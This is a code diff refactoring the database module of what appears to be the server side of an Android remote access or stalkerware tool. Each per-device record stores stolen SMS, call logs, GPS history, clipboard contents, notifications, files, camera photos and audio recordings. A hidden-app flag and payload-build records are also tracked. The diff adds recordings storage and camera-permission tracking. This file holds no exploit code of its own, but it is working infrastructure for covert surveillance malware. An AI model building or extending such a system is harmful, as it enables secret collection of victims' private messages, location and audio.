@@ -3,79 +3,59 @@ const path = require('path');
 const low = require('lowdb');
 const FileSync = require('lowdb/adapters/FileSync');
 const config = require('../config/config');
+const { ensureDir } = require('../utils/ensureDir');
 
-// Initialize logging (we can't use logger here as it depends on db)
-const logInit = (type, msg) => console.log(`[${new Date().toISOString()}] [${type}] ${msg}`);
-
-// Ensure directories exist
-function initDirectories() {
-    try {
-        const dirs = [
-            config.dbPath, 
-            config.downloadsPath, 
-            config.photosPath, 
-            path.join(config.dbPath, 'clients'),
-            path.join(config.dbPath, 'backups')
-        ];
-        
-        dirs.forEach(dir => {
-            if (!fs.existsSync(dir)) {
-                fs.mkdirSync(dir, { recursive: true });
-                logInit('INFO', `Created directory: ${dir}`);
-            }
-        });
-    } catch (e) {
-        logInit('ERROR', `Failed to create directories: ${e.message}`);
-    }
-}
+// Simple logger (can't use main logger here)
+const log = (type, msg) => console.log(`[${new Date().toISOString()}] [${type}] ${msg}`);
 
 // Initialize directories
-initDirectories();
+const initDirs = () => {
+    const dirs = [
+        config.dbPath,
+        config.downloadsPath,
+        config.photosPath,
+        config.recordingsPath,
+        path.join(config.dbPath, 'clients'),
+        path.join(config.dbPath, 'backups')
+    ];
+    dirs.forEach(dir => {
+        ensureDir(dir);
+        log('INFO', `Ensured directory: ${dir}`);
+    });
+};
+
+initDirs();
 
 // Main database
-let main;
-try {
-    const mainPath = path.join(config.dbPath, 'main.json');
-    const mainAdapter = new FileSync(mainPath);
-    main = low(mainAdapter);
-    
-    main.defaults({
-        users: [],
-        sessions: [],
-        clients: [],
-        settings: {
-            serverStart: new Date().toISOString(),
-            version: '2.2.2',
-            maxClients: 500,
-            maxDownloads: 100,
-            maxPhotos: 100
-        },
-        build: {
-            serverUrl: '',
-            homePageUrl: '',
-            lastBuild: null,
-            buildCount: 0
-        }
-    }).write();
-    
-    // Run migrations if needed
-    const settings = main.get('settings').value();
-    if (!settings.version || settings.version < '2.2.2') {
-        main.get('settings').assign({ version: '2.2.2' }).write();
-        logInit('INFO', 'Database migrated to v2.2.2');
+const mainPath = path.join(config.dbPath, 'main.json');
+const main = low(new FileSync(mainPath));
+
+main.defaults({
+    users: [],
+    sessions: [],
+    clients: [],
+    settings: {
+        serverStart: new Date().toISOString(),
+        version: '2.2.2',
+        maxClients: 500,
+        maxDownloads: 100,
+        maxPhotos: 100
+    },
+    build: {
+        serverUrl: '',
+        homePageUrl: '',
+        lastBuild: null,
+        buildCount: 0
     }
-    
-    logInit('INFO', 'Main database initialized');
-} catch (e) {
-    logInit('ERROR', `Failed to initialize main database: ${e.message}`);
-    process.exit(1);
-}
+}).write();
+
+log('INFO', 'Main database initialized');
 
 // Client database cache
 const clientDbs = {};
 
-// Default client data schema
-const defaultClientSchema = (id) => ({
+// Default client schema
+const defaultSchema = (id) => ({
     id,
     queue: [],
     sms: [],
@@ -89,220 +69,176 @@ const defaultClientSchema = (id) => ({
     gps: [],
     gpsInterval: 0,
     downloads: [],
+    recordings: [],
     files: [],
     currentPath: '',
     cameras: [],
     photos: [],
-    callsLimit: 250,
-    smsLimit: 250,
-    gpsLimit: 100,
-    notificationsLimit: 200,
-    clipboardLimit: 200,
+    cameraPermission: false,
+    deviceInfo: null,
+    fasonHidden: false,
     lastUpdated: new Date().toISOString()
 });
 
 // Get or create client database
-function client(id) {
-    if (!id || typeof id !== 'string') {
-        logInit('ERROR', 'Invalid client ID');
-        return null;
-    }
-    
-    // Return cached db if exists
-    if (clientDbs[id]) {
-        return clientDbs[id];
-    }
-    
+const client = (id) => {
+    if (!id || typeof id !== 'string') return null;
+    if (clientDbs[id]) return clientDbs[id];
+
     try {
         const file = path.join(config.dbPath, 'clients', `${id}.json`);
-        const adapter = new FileSync(file);
-        const db = low(adapter);
-        
-        // Set defaults
-        db.defaults(defaultClientSchema(id)).write();
-        
-        // Update last accessed
+        const db = low(new FileSync(file));
+        db.defaults(defaultSchema(id)).write();
         db.set('lastUpdated', new Date().toISOString()).write();
-        
         clientDbs[id] = db;
         return db;
     } catch (e) {
-        logInit('ERROR', `Failed to create client database for ${id}: ${e.message}`);
+        log('ERROR', `Failed to create client database: ${e.message}`);
         return null;
     }
-}
+};
 
 // Get all client IDs
-function getClientIds() {
+const getClientIds = () => {
     try {
-        const clientsDir = path.join(config.dbPath, 'clients');
-        if (!fs.existsSync(clientsDir)) return [];
-        
-        return fs.readdirSync(clientsDir)
+        const dir = path.join(config.dbPath, 'clients');
+        if (!fs.existsSync(dir)) return [];
+        return fs.readdirSync(dir)
             .filter(f => f.endsWith('.json'))
             .map(f => f.replace('.json', ''));
     } catch (e) {
-        logInit('ERROR', `Failed to get client IDs: ${e.message}`);
         return [];
     }
-}
+};
 
 // Check if client exists
-function clientExists(id) {
-    const file = path.join(config.dbPath, 'clients', `${id}.json`);
-    return fs.existsSync(file);
-}
+const clientExists = (id) => {
+    return fs.existsSync(path.join(config.dbPath, 'clients', `${id}.json`));
+};
 
-// Delete client data
-function deleteClient(id) {
+// Delete client
+const deleteClient = (id) => {
     try {
-        // Remove from main database
         main.get('clients').remove({ id }).write();
-        
-        // Delete client database file
         const file = path.join(config.dbPath, 'clients', `${id}.json`);
-        if (fs.existsSync(file)) {
-            fs.unlinkSync(file);
-        }
-        
-        // Remove from cache
+        if (fs.existsSync(file)) fs.unlinkSync(file);
         delete clientDbs[id];
-        
-        // Clean up downloads
         cleanClientFiles(id);
-        
         return true;
     } catch (e) {
-        logInit('ERROR', `Failed to delete client ${id}: ${e.message}`);
         return false;
     }
-}
+};
 
-// Clear client data (keep client record, clear data)
-function clearClientData(id) {
+// Clear client data
+const clearClientData = (id) => {
     try {
         const cdb = client(id);
         if (!cdb) return false;
-        
-        cdb.assign(defaultClientSchema(id)).write();
+        cdb.assign(defaultSchema(id)).write();
         return true;
     } catch (e) {
-        logInit('ERROR', `Failed to clear client data ${id}: ${e.message}`);
         return false;
     }
-}
+};
 
 // Clean client files
-function cleanClientFiles(id) {
+const cleanClientFiles = (id) => {
     try {
-        // Clean downloads
-        const downloads = fs.existsSync(config.downloadsPath) 
-            ? fs.readdirSync(config.downloadsPath).filter(f => f.startsWith(id))
-            : [];
-        downloads.forEach(f => {
-            try {
-                fs.unlinkSync(path.join(config.downloadsPath, f));
-            } catch (ignored) {}
+        [config.downloadsPath, config.photosPath, config.recordingsPath].forEach(dir => {
+            if (fs.existsSync(dir)) {
+                fs.readdirSync(dir)
+                    .filter(f => f.startsWith(id))
+                    .forEach(f => {
+                        try { fs.unlinkSync(path.join(dir, f)); } catch (e) {}
+                    });
+            }
         });
-        
-        // Clean photos
-        const photos = fs.existsSync(config.photosPath)
-            ? fs.readdirSync(config.photosPath).filter(f => f.startsWith(id))
-            : [];
-        photos.forEach(f => {
-            try {
-                fs.unlinkSync(path.join(config.photosPath, f));
-            } catch (ignored) {}
-        });
-    } catch (e) {
-        logInit('WARNING', `Failed to clean files for ${id}`);
-    }
-}
+    } catch (e) {}
+};
 
-// Trim data to prevent unbounded growth
-function trimClientData(id) {
+// Trim client data
+const trimClientData = (id) => {
     try {
         const cdb = client(id);
         if (!cdb) return false;
-        
-        const limits = config.limits || {};
-        const maxGps = limits.maxGpsHistory || 100;
-        const maxNotifications = limits.maxNotifications || 200;
-        const maxClipboard = limits.maxClipboardHistory || 200;
-        const maxDownloads = limits.maxDownloads || 100;
-        const maxPhotos = limits.maxPhotos || 100;
-        
-        // Trim GPS
-        const gps = cdb.get('gps').value() || [];
-        if (gps.length > maxGps) {
-            cdb.set('gps', gps.slice(-maxGps)).write();
-        }
-        
-        // Trim notifications
-        const notifs = cdb.get('notifications').value() || [];
-        if (notifs.length > maxNotifications) {
-            cdb.set('notifications', notifs.slice(-maxNotifications)).write();
-        }
-        
-        // Trim clipboard
-        const clipboard = cdb.get('clipboard').value() || [];
-        if (clipboard.length > maxClipboard) {
-            cdb.set('clipboard', clipboard.slice(-maxClipboard)).write();
-        }
-        
-        // Trim downloads
+
+        const { maxGpsHistory, maxNotifications, maxClipboardHistory, maxDownloads, maxPhotos, maxRecordings, maxSmsHistory, maxCallsHistory } = config.limits;
+
+        // Trim arrays
+        const trim = (key, max) => {
+            const arr = cdb.get(key).value() || [];
+            if (arr.length > max) {
+                cdb.set(key, arr.slice(-max)).write();
+            }
+        };
+
+        trim('gps', maxGpsHistory);
+        trim('notifications', maxNotifications);
+        trim('clipboard', maxClipboardHistory);
+        trim('sms', maxSmsHistory);
+        trim('calls', maxCallsHistory);
+
+        // Trim downloads with file cleanup
         const downloads = cdb.get('downloads').value() || [];
         if (downloads.length > maxDownloads) {
-            const toRemove = downloads.slice(0, downloads.length - maxDownloads);
-            toRemove.forEach(item => {
+            downloads.slice(0, downloads.length - maxDownloads).forEach(item => {
                 try {
-                    const filePath = path.join(config.downloadsPath, path.basename(item.file));
-                    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
-                } catch (ignored) {}
+                    const fp = path.join(config.downloadsPath, path.basename(item.file));
+                    if (fs.existsSync(fp)) fs.unlinkSync(fp);
+                } catch (e) {}
             });
             cdb.set('downloads', downloads.slice(-maxDownloads)).write();
         }
-        
-        // Trim photos
+
+        // Trim photos with file cleanup
         const photos = cdb.get('photos').value() || [];
         if (photos.length > maxPhotos) {
-            const toRemove = photos.slice(0, photos.length - maxPhotos);
-            toRemove.forEach(item => {
+            photos.slice(0, photos.length - maxPhotos).forEach(item => {
                 try {
-                    const filePath = path.join(config.photosPath, path.basename(item.file));
-                    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
-                } catch (ignored) {}
+                    const fp = path.join(config.photosPath, path.basename(item.file));
+                    if (fs.existsSync(fp)) fs.unlinkSync(fp);
+                } catch (e) {}
             });
             cdb.set('photos', photos.slice(-maxPhotos)).write();
         }
-        
+
+        // Trim recordings with file cleanup
+        const recordings = cdb.get('recordings').value() || [];
+        if (recordings.length > maxRecordings) {
+            recordings.slice(0, recordings.length - maxRecordings).forEach(item => {
+                try {
+                    const fp = path.join(config.recordingsPath, path.basename(item.file));
+                    if (fs.existsSync(fp)) fs.unlinkSync(fp);
+                } catch (e) {}
+            });
+            cdb.set('recordings', recordings.slice(-maxRecordings)).write();
+        }
+
         return true;
     } catch (e) {
-        logInit('ERROR', `Failed to trim client data ${id}: ${e.message}`);
         return false;
     }
-}
+};
 
 // Get database stats
-function getStats() {
+const getStats = () => {
     try {
         const clientIds = getClientIds();
         let totalSize = 0;
-        
-        // Get main db size
-        const mainPath = path.join(config.dbPath, 'main.json');
-        if (fs.existsSync(mainPath)) {
-            totalSize += fs.statSync(mainPath).size;
-        }
-        
-        // Get logs db size
-        const logsPath = path.join(config.dbPath, 'logs.json');
-        if (fs.existsSync(logsPath)) {
-            totalSize += fs.statSync(logsPath).size;
-        }
-        
-        // Get client dbs size
         let clientSize = 0;
+        let downloadsSize = 0;
+        let photosSize = 0;
+
+        // Main db size
+        const mainFile = path.join(config.dbPath, 'main.json');
+        if (fs.existsSync(mainFile)) totalSize += fs.statSync(mainFile).size;
+
+        // Logs db size
+        const logsFile = path.join(config.dbPath, 'logs.json');
+        if (fs.existsSync(logsFile)) totalSize += fs.statSync(logsFile).size;
+
+        // Client dbs size
         clientIds.forEach(id => {
             const file = path.join(config.dbPath, 'clients', `${id}.json`);
             if (fs.existsSync(file)) {
@@ -311,124 +247,92 @@ function getStats() {
                 clientSize += size;
             }
         });
-        
-        // Get downloads size
-        let downloadsSize = 0;
+
+        // Downloads size
         if (fs.existsSync(config.downloadsPath)) {
             fs.readdirSync(config.downloadsPath).forEach(f => {
-                try {
-                    downloadsSize += fs.statSync(path.join(config.downloadsPath, f)).size;
-                } catch (ignored) {}
+                try { downloadsSize += fs.statSync(path.join(config.downloadsPath, f)).size; } catch (e) {}
             });
         }
-        
-        // Get photos size
-        let photosSize = 0;
+
+        // Photos size
         if (fs.existsSync(config.photosPath)) {
             fs.readdirSync(config.photosPath).forEach(f => {
-                try {
-                    photosSize += fs.statSync(path.join(config.photosPath, f)).size;
-                } catch (ignored) {}
+                try { photosSize += fs.statSync(path.join(config.photosPath, f)).size; } catch (e) {}
             });
         }
-        
+
         return {
             clientCount: clientIds.length,
             dbSize: totalSize,
             clientDbSize: clientSize,
             downloadsSize,
             photosSize,
-            totalSize: totalSize + downloadsSize + photosSize,
-            downloadsPath: config.downloadsPath,
-            photosPath: config.photosPath
+            totalSize: totalSize + downloadsSize + photosSize
         };
     } catch (e) {
         return { error: e.message };
     }
-}
+};
 
 // Backup database
-function backup(backupPath) {
+const backup = (backupPath) => {
     try {
-        const backupDir = backupPath || path.join(
-            config.dbPath, 
-            'backups', 
-            `backup-${new Date().toISOString().replace(/[:.]/g, '-')}`
-        );
-        fs.mkdirSync(backupDir, { recursive: true });
-        
-        // Copy main db
-        const mainPath = path.join(config.dbPath, 'main.json');
-        if (fs.existsSync(mainPath)) {
-            fs.copyFileSync(mainPath, path.join(backupDir, 'main.json'));
-        }
-        
-        // Copy logs db
-        const logsPath = path.join(config.dbPath, 'logs.json');
-        if (fs.existsSync(logsPath)) {
-            fs.copyFileSync(logsPath, path.join(backupDir, 'logs.json'));
-        }
-        
+        const dir = backupPath || path.join(config.dbPath, 'backups', `backup-${Date.now()}`);
+        ensureDir(dir);
+
+        // Copy main and logs
+        ['main.json', 'logs.json'].forEach(f => {
+            const src = path.join(config.dbPath, f);
+            if (fs.existsSync(src)) fs.copyFileSync(src, path.join(dir, f));
+        });
+
         // Copy client dbs
         const clientsDir = path.join(config.dbPath, 'clients');
-        const backupClientsDir = path.join(backupDir, 'clients');
-        fs.mkdirSync(backupClientsDir, { recursive: true });
-        
+        const backupClientsDir = path.join(dir, 'clients');
+        ensureDir(backupClientsDir);
+
         if (fs.existsSync(clientsDir)) {
             fs.readdirSync(clientsDir)
                 .filter(f => f.endsWith('.json'))
-                .forEach(f => {
-                    fs.copyFileSync(
-                        path.join(clientsDir, f),
-                        path.join(backupClientsDir, f)
-                    );
-                });
+                .forEach(f => fs.copyFileSync(path.join(clientsDir, f), path.join(backupClientsDir, f)));
         }
-        
-        logInit('INFO', `Backup created: ${backupDir}`);
-        return { success: true, path: backupDir };
+
+        log('INFO', `Backup created: ${dir}`);
+        return { success: true, path: dir };
     } catch (e) {
-        logInit('ERROR', `Backup failed: ${e.message}`);
+        log('ERROR', `Backup failed: ${e.message}`);
         return { success: false, error: e.message };
     }
-}
+};
 
-// Cleanup old backups (keep last 10)
-function cleanupBackups() {
+// Cleanup old backups
+const cleanupBackups = () => {
     try {
-        const backupsDir = path.join(config.dbPath, 'backups');
-        if (!fs.existsSync(backupsDir)) return;
-        
-        const backups = fs.readdirSync(backupsDir)
+        const dir = path.join(config.dbPath, 'backups');
+        if (!fs.existsSync(dir)) return;
+
+        fs.readdirSync(dir)
             .filter(f => f.startsWith('backup-'))
             .sort()
-            .reverse();
-        
-        // Remove old backups (keep last 10)
-        backups.slice(10).forEach(f => {
-            try {
-                const dir = path.join(backupsDir, f);
-                fs.rmSync(dir, { recursive: true, force: true });
-                logInit('INFO', `Removed old backup: ${f}`);
-            } catch (ignored) {}
-        });
-    } catch (e) {
-        logInit('WARNING', `Backup cleanup failed: ${e.message}`);
-    }
-}
+            .reverse()
+            .slice(10)
+            .forEach(f => {
+                try { fs.rmSync(path.join(dir, f), { recursive: true, force: true }); } catch (e) {}
+            });
+    } catch (e) {}
+};
 
-// Note: Cleanup is handled by tasks.js (dbMaintenance task) - no duplicate interval here
-
-module.exports = { 
-    main, 
-    client, 
-    getClientIds, 
+module.exports = {
+    main,
+    client,
+    getClientIds,
     clientExists,
-    deleteClient, 
+    deleteClient,
     clearClientData,
     trimClientData,
-    getStats, 
+    getStats,
     backup,
     cleanupBackups,
-    initDirectories
+    initDirs
 };
